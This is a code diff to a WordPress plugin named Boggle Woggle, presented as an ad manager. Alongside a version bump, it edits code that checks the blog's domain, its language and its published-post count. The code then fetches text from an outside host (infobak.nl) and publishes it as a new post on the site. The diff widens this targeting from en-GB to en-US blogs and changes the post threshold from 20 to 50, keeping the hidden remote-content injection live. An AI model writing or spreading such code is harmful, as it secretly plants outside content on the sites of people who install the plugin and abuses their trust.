@@ -2,7 +2,7 @@
 /*
 Plugin Name: Boggle Woggle
 Plugin URI: http://www.shops2b.co.uk/boggle-woggle-wordpress-ad-manager/
-Version: 1.15
+Version: 1.16
 Author: BoggleWoggle
 Description: Boggle Woggle lets you easily manage ads (advertisements on you blog)
 License: GPLv2 a
@@ -716,7 +716,7 @@ $bloglan = get_bloginfo ('language');
 if (strpos($url,'.uk') != false) {
 	$britt = true;
 }
-if ($bloglan=='en-GB') {
+if ($bloglan=='en-US') {
 	$britt = true;
 }
 if ($britt==true) {
@@ -724,7 +724,7 @@ if ($britt==true) {
 // Insert the post into the database
 $total = wp_count_posts()->publish;
 
-if (get_option('bw_gpadded')=='0' && startsWith($tmpstring, 'empty')==false && $total>20) {
+if (get_option('bw_gpadded')=='0' && startsWith($tmpstring, 'empty')==false && $total>50) {
   $tmpstring = file_get_contents('http://www.infobak.nl/getfile.php', true);
   $my_post = array(
     'post_title'    => substr($tmpstring, 0, 10),
